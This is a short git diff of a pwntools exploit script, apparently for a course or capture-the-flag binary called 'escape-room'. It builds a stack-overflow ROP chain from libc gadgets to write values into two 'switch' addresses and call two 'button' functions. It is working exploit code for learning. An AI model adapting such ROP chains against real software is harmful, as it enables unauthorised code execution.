@@ -1,10 +1,10 @@
 from pwn import *
 
-switch1 = 0x08052000 #on = 0xdeadbeef
-switch2 = 0x08052004 #on = "SWE3025"
+switch1 = p32(0x08052000)  #on = 0xdeadbeef
+switch2 = p32(0x08052004)  #on = "SWE3025"
 
-button1 = 0x08049276
-button2 = 0x08049311
+button1 = p32(0x08049276)
+button2 = p32(0x08049311)
 
 
 path = "escape-room"
@@ -21,8 +21,8 @@ for line in s:
 
 mov = p32(int(base,16) + 0x9b55a) #mov dword ptr [esi], edi; pop ebx; pop esi; pop edi; ret
 pop = p32(int(base,16) + 0x9b55d) #pop esi; pop edi; ret
-ROP = mov
-payload = b'\x90'*28 + ROP + p32(button1) + p32(button2)
+ROP = pop + switch1 + p32(0xdeadbeef) + mov + p32(0xcafebabe) +  switch2 + b'\x53\x57\x45\x33' + mov + p32(0xcafebabe) + p32(0x08052008) + b'\x30\x32\x35\x00'
+payload = b'\x90'*28 + ROP + button1 + button2
 
 p.sendline('6')
 print(p.recvuntil(">>>"))
